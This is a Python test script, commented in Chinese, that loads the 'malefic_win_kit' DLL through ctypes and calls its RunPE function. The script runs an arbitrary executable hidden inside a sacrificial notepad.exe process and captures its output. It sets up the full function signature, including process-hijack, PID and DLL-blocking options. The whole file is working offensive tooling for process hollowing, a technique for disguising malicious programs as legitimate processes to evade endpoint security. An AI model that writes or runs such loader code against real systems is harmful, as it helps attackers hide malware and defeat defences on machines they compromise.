#!/usr/bin/env python3
"""
Python 调用 malefic-win-kit.dll 示例
运行: python runpe_test.py target.exe
"""

import ctypes
from ctypes import *
import sys
import os

# 1. 定义 RawString 结构体（必须与 Rust 匹配）
class RawString(Structure):
    _fields_ = [
        ("data", POINTER(c_uint8)),
        ("len", c_size_t),
        ("capacity", c_size_t)
    ]

class WinKitError(Exception):
    """WinKit 异常"""
    pass

class MaleficWinKit:
    """Malefic-Win-Kit DLL 封装类"""

    def __init__(self, dll_path="malefic_win_kit.dll"):
        """
        初始化并加载 DLL

        Args:
            dll_path: DLL 文件路径
        """
        print(f"[*] Loading {dll_path}...")

        try:
            # Python 3.8+ 需要添加 DLL 搜索路径
            if hasattr(os, 'add_dll_directory'):
                # 添加当前目录到 DLL 搜索路径
                dll_dir = os.path.dirname(os.path.abspath(dll_path))
                if dll_dir:
                    os.add_dll_directory(dll_dir)
                else:
                    os.add_dll_directory(os.getcwd())

            # 加载 DLL
            self.dll = ctypes.CDLL(dll_path)
            print("[+] DLL loaded successfully")
        except OSError as e:
            raise WinKitError(f"Failed to load DLL: {e}")

        # 配置 RunPE 函数
        self._setup_run_pe()

        # 配置 SafeFreePipeData 函数
        self._setup_safe_free()

        print("[+] Functions configured successfully\n")

    def _setup_run_pe(self):
        """配置 RunPE 函数签名"""
        # 重要：restype 设置为 None，因为我们通过第一个参数接收返回值
        self.dll.RunPE.restype = None

        # 参数类型（第一个参数是返回值指针）
        self.dll.RunPE.argtypes = [
            POINTER(RawString),   # result (返回值指针)
            POINTER(c_uint8),     # start_commandline
            c_size_t,             # start_commandline_len
            POINTER(c_uint8),     # hijack_commandline
            c_size_t,             # hijack_commandline_len
            POINTER(c_uint8),     # data
            c_size_t,             # data_size
            POINTER(c_uint8),     # entrypoint
            c_size_t,             # entrypoint_len
            POINTER(c_uint8),     # args
            c_size_t,             # args_len
            c_bool,               # is_x86
            c_uint32,             # pid
            c_bool,               # block_dll
            c_bool                # need_output
        ]

    def _setup_safe_free(self):
        """配置 SafeFreePipeData 函数签名"""
        self.dll.SafeFreePipeData.argtypes = [POINTER(c_uint8)]
        self.dll.SafeFreePipeData.restype = None

    def run_pe(self, sacrifice_process, pe_data, args=None):
        """
        执行 PE 文件

        Args:
            sacrifice_process: 牺牲进程路径（字符串）
            pe_data: PE 文件数据（bytes）
            args: 传递给 PE 的参数（字符串，可选）

        Returns:
            执行结果（字符串）或 None
        """
        print(f"[*] Sacrifice process: {sacrifice_process}")
        print(f"[*] PE data size: {len(pe_data)} bytes")

        # 验证 PE 文件
        if len(pe_data) < 2 or pe_data[0] != ord('M') or pe_data[1] != ord('Z'):
            raise WinKitError("Invalid PE file (missing MZ header)")

        # 转换参数为 C 类型
        sacrifice_bytes = sacrifice_process.encode('utf-8')
        sacrifice_array = (c_uint8 * len(sacrifice_bytes)).from_buffer_copy(sacrifice_bytes)

        pe_array = (c_uint8 * len(pe_data)).from_buffer_copy(pe_data)

        args_array = None
        args_len = 0
        if args:
            args_bytes = args.encode('utf-8')
            args_array = (c_uint8 * len(args_bytes)).from_buffer_copy(args_bytes)
            args_len = len(args_bytes)

        # 分配返回值结构体
        result = RawString()

        print("[*] Calling RunPE...\n")

        # 调用 RunPE（第一个参数是返回值指针）
        self.dll.RunPE(
            byref(result),              # 返回值指针（重要！）
            sacrifice_array,            # start_commandline
            len(sacrifice_bytes),       # start_commandline_len
            None,                       # hijack_commandline
            0,                          # hijack_commandline_len
            pe_array,                   # data
            len(pe_data),               # data_size
            None,                       # entrypoint
            0,                          # entrypoint_len
            args_array,                 # args
            args_len,                   # args_len
            False,                      # is_x86
            0,                          # pid
            False,                      # block_dll
            True                        # need_output
        )

        # 处理结果
        print("=== Result ===")
        print(f"Data pointer: {result.data}")
        print(f"Length: {result.len}")
        print(f"Capacity: {result.capacity}\n")

        if result.data and result.len > 0:
            # 读取输出
            output_bytes = string_at(result.data, result.len)

            # 释放内存
            print("[*] Freeing memory...")
            self.dll.SafeFreePipeData(result.data)
            print("[+] Memory freed\n")

            # 转换为字符串
            try:
                return output_bytes.decode('utf-8', errors='replace')
            except:
                return output_bytes.decode('gbk', errors='replace')
        else:
            return None

def main():
    print("=== Malefic-Win-Kit Python Test ===\n")

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target.exe>")
        print(f"Example: {sys.argv[0]} gogo.exe")
        sys.exit(1)

    target_file = sys.argv[1]

    if not os.path.exists(target_file):
        print(f"[-] File not found: {target_file}")
        sys.exit(1)

    try:
        # 创建 WinKit 实例
        kit = MaleficWinKit("malefic_win_kit.dll")

        # 读取 PE 文件
        print(f"[*] Reading PE file: {target_file}")
        with open(target_file, "rb") as f:
            pe_data = f.read()
        print(f"[+] Loaded PE: {len(pe_data)} bytes\n")

        # 执行 PE
        output = kit.run_pe(r"C:\Windows\System32\notepad.exe", pe_data)

        if output:
            print("=== Output ===")
            print(output)
            print("=============\n")
        else:
            print("[-] No output received or execution failed\n")

        print("[+] Done!")

    except WinKitError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
